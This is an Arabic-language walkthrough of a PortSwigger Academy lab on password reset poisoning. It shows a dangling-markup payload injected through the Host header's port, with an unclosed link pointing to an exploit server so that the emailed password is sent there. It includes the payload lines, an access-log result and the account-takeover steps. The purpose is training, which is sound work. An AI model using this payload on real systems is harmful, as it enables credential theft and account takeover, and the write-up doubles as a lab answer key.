# Lab : Password reset poisoning via dangling markup

https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup

- الفكره من الLab ده

```bash
1. Host: 0af4009b032062ba8019032e00090020.web-security-academy.net:'<a href="//exploit-0a74002003dc62e780e1028801570059.exploit-server.net/?
```

اللاب ده بيجمع بين **3 مفاهيم متقدمة** مع بعض:

1. **Password reset poisoning** (تسميم رابط إعادة تعيين الباسورد) — زي اللاب اللي شرحناه قبل كده بس بطريقة مختلفة.
2. **Host header injection عن طريق البورت (port)** بدل الدومين نفسه.
3. **Dangling Markup Injection** — تقنية استغلال XSS بديلة لما يكون فيه **sanitization قوي** (زي DOMPurify) بيمنع الـ XSS التقليدي.

### المفهوم الأساسي: إيه هو "Dangling Markup Injection"؟

لما تطبيق بيستخدم مكتبة تنظيف قوية زي **DOMPurify** (بتشيل أي `<script>` أو event handlers خطيرة)، الـ XSS التقليدي بيبقى صعب أو مستحيل. لكن **Dangling Markup** تقنية بديلة:

بدل ما تحقن كود JavaScript، بتحقن **بداية عنصر HTML غير مكتمل** (زي `<a href="//attacker.com/?`) **بدون ما تقفله**. المتصفح (أو أي parser HTML) هيفترض إن **كل النص اللي جاي بعد كده في الصفحة** هو جزء من قيمة الـ attribute دي (`href`)، **لحد ما يلاقي علامة تنصيص أو `>` تقفل العنصر**. النتيجة: أي معلومة حساسة موجودة **بعد** نقطة الحقن في نفس الصفحة (زي باسورد جديد مثلاً) هتتلحق تلقائيًا في نهاية الرابط، ولو الضحية أو أي أداة (زي antivirus بيفحص الروابط) فتحت الرابط ده، **المعلومة الحساسة هتتبعت لسيرفر المهاجم** كجزء من الـ URL.

### طبيعة اللاب بالتفصيل

#### السياق

لما تطلب "Forgot password"، الموقع:

1. بيبعت إيميل فيه **باسورد جديد مكتوب مباشرة في نص الإيميل** (مش لينك فيه token زي المعتاد).
2. الرابط الموجود في الإيميل بيشاور بس على صفحة اللوجن العادية (من غير أي token).

#### نقطة الضعف الأولى: الفحص بيحصل على النسخة المُعرّضة (rendered) بس

لما تفتح الإيميل في الـ email client بتاع الـ exploit server، الـ **HTML بتاع الإيميل بيتنضف (sanitize) باستخدام DOMPurify** قبل ما يتعرض في المتصفح — فأي XSS تقليدي هيتشال.

**لكن**: فيه خيار في الـ email client لعرض **الـ raw HTML** (النسخة الخام غير المُنقّاة). دي **مش بتتعمل لها أي sanitization**.

#### نقطة الضعف التانية: Host header بيتحقن في رابط داخل الإيميل

جرب تلاعب في **دومين الـ Host header** — هيدّيك خطأ سيرفر (يبقى الدومين نفسه محمي). لكن لو ضفت **بورت غير رقمي (non-numeric port)** بعد الدومين، الطلب **بيعدي عادي**:

```
Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport
```

والباسورد بيتبعت زي العادي، **والبورت ده بينعكس (reflected) في محتوى الإيميل** جوه رابط، كـ **string غير محمي (unescaped) بين علامتي تنصيص مفردة (single quotes)**.

### خطوات الحل بالتفصيل

#### 1. اطلب Password Reset لحسابك

روح لصفحة اللوجن، اطلب "Forgot password" لحسابك (`wiener`).

#### 2. افحص الإيميل الأساسي

افتح الـ email client من الـ exploit server، هتلاقي إيميل فيه:

- رابط بيشاور بس على صفحة اللوجن العادية (من غير أي token).
- **باسورد جديد مكتوب مباشرة** في نص الإيميل.

#### 3. افحص الـ Response بتاع `GET /email`

في Burp Proxy history، هتلاقي إن محتوى الإيميل (HTML) بيتكتب كـ string، لكن بيتنضف بـ **DOMPurify** قبل ما يتعرض في المتصفح.

#### 4. اكتشف خيار الـ Raw HTML

في الـ email client، هتلاقي خيار لعرض الإيميل بصيغة **raw HTML** (بدلاً من النسخة المُعرّضة/rendered) — دي النسخة اللي **مش بتتعمل لها أي sanitization**.

#### 5. جرب تلاعب في الـ Host header

ابعت الـ `POST /forgot-password` على **Burp Repeater**. جرب تغيّر:

- **الدومين** في Host header → السيرفر بيرجع **server error** (محمي).
- **إضافة بورت غير رقمي** بعد الدومين → الطلب **بيعدي عادي**:

```
  Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport
```

والإيميل لسه بيتبعت (فيه باسورد جديد).

#### 6. افحص الـ Raw HTML للإيميل الجديد

هتلاحظ إن **قيمة البورت اللي انت حطيتها بتظهر جوه رابط في الإيميل**، محاطة بعلامة تنصيص مفردة (`'`) **بدون أي escaping**، وبعدها مباشرة **باقي محتوى الإيميل بما فيه الباسورد الجديد**.

#### 7. حقن Dangling Markup Payload عن طريق البورت

دلوقتي، بدل بورت عادي، هنستخدم قيمة البورت عشان **نكسر الـ string ونحقن بداية عنصر `<a>` غير مكتمل** بيشاور على الـ exploit server بتاعنا:

```
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```

**الفكرة**:

- علامة التنصيص المفردة (`'`) بتقفل الـ string اللي كانت القيمة القديمة محبوسة فيها.
- `<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?` بتفتح عنصر رابط جديد **بدون ما تقفله**.
- بما إن العنصر ده **مش مقفول**، أي نص جاي بعده في محتوى الإيميل (زي باقي الرابط الأصلي، وبعدين الباسورد الجديد) **هيتحسب تلقائيًا كجزء من قيمة الـ `href`**.

#### 8. افحص النتيجة في الـ Email Client والـ Access Log

هتلاقي إن الإيميل الجديد اللي وصلك **معظم محتواه مفقود** — لأن أي نص بعد نقطة الحقن اتحسب على إنه جزء من رابط، مش نص عادي في الصفحة.

روح لـ **exploit server > Access log**، هتلاقي طلب وصل بشكل:

```
GET /?/login'>[…]
```

فيه **باقي محتوى الإيميل بالكامل**، بما فيه **الباسورد الجديد** — لأن حاجة ما (المتصفح، أو أداة antivirus بتفحص الروابط زي ما ألمح الـ Hint) **فتحت الرابط الملغوم ده**، وبكده بعتت كل المحتوى الملحق بيه لسيرفرنا.

#### 9. كرر العملية لصالح carlos

ابعت الـ `POST /forgot-password` تاني بنفس الـ Host header الملغوم، لكن غيّر الـ `username` لـ:

```
username=carlos
```

#### 10. افحص الـ Access Log تاني

هتلاقي **إدخال جديد** فيه باسورد `carlos` الجديد ملحق في نهاية الرابط المسروق.

#### 11. سجل دخول بحساب carlos

```
username: carlos
password: <الباسورد الجديد اللي طلع في الـ access log>
```

اللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

html

```html
<!-- محتوى الإيميل الأصلي --><a href='https://YOUR-LAB-ID.web-security-academy.net:ARBITRARY-PORT/login'>Click here to log in</a>Your new password is: SomeNewPassword123
```

لو استبدلنا `ARBITRARY-PORT` بـ:

```
'<a href="//exploit-server.net/?
```

النتيجة تبقى:

html

```html
<a href=''<a href="//exploit-server.net/?/login'>Click here to log in</a>Your new password is: SomeNewPassword123
```

الـ HTML parser بيقرا ده كالتالي:

- أول `<a href=''` بتتقفل فورًا (فارغة).
- بعدها فورًا **عنصر `<a>` جديد** بـ `href="//exploit-server.net/?/login'>Click here to log in</a>\nYour new password is: SomeNewPassword123` — **كل ده يتحسب كـ href واحد طويل**، لأن مفيش علامة تنصيص مزدوجة (`"`) تانية تقفل الـ attribute غير في الآخر (لو موجودة أصلاً) أو لحد نهاية المحتوى.

فلما "حد" (زي antivirus بيفحص الروابط زي الـ Hint بيقول) يفتح الرابط ده، هيبعت **كل الـ query string دي** (بما فيها الباسورد) **لسيرفر المهاجم**.

### الدرس المستفاد

- **Dangling Markup Injection تقنية استغلال قوية لما يكون XSS التقليدي محظور بسبب sanitization قوي (زي DOMPurify)** — لأنها **مش بتحتاج تنفيذ JavaScript خالص**، بس بتعتمد على **طريقة الـ HTML parser في تفسير عناصر غير مكتملة**.
- **أي مكان بيعمل sanitize لمحتوى، لازم يتأكد إن كل "نسخ" المحتوى دي بتتعرض بنفس الطريقة الآمنة** — هنا كانت المشكلة إن **النسخة المُعرّضة (rendered)** كانت محمية، لكن **النسخة الخام (raw)** ماكانتش.
- **Host header ممكن يُستغل حتى عن طريق أجزاء "غير متوقعة" منه زي البورت (port)**، مش بس الدومين نفسه — أي جزء من الطلب بيتعكس (reflect) في أي مكان بالتطبيق لازم يُفحص ويُعقّم (sanitize) بغض النظر عن "مدى أهميته الظاهرية".
- **إرسال باسوردات جديدة مباشرة في نص الإيميل** (بدل رابط فيه token) ممارسة سيئة من الأساس — لأنها بتعرّض الباسورد لأي هجوم بيقدر يوصل لمحتوى الإيميل، بما فيه هجمات زي دي.
- الملاحظة في الـ Hint (إن **antivirus software بيفحص الروابط في الإيميلات**) بتوضح **متجه هجوم إضافي مهم**: مش بس الضحية نفسه اللي ممكن "يفتح" رابط ضار، لكن **أدوات أمان أوتوماتيكية** كمان ممكن "تزور" الروابط دي تلقائيًا كجزء من فحصها، وده بيدّي المهاجم وسيلة **مضمونة** إن حد (حتى لو مش إنسان) هيفتح الرابط الملغوم بدون أي تفاعل بشري مطلوب.
